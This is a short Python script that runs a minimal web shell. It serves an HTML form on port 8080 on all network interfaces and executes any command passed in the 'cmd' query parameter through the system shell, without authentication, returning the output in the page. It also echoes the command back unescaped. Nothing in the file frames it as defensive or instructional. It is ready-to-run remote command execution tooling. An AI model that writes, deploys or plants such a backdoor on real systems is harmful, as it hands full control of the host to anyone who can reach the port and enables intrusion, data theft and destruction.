import urllib.parse, subprocess, http.server
form = b"""<form method="get" action="?">
<p><input type="text" name="cmd" value="%s"/><input type="submit" value="Run" /></p>
</form>"""
class ShellSrv(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        cmd = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query).get('cmd', [''])[0]
        if len(cmd) != 0:
            r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            output = r.stdout
            self.wfile.write(b"<pre>" + output + b"</pre>")
        self.wfile.write(form%cmd.encode())
        
http.server.HTTPServer(("0.0.0.0", 8080), ShellSrv).serve_forever()
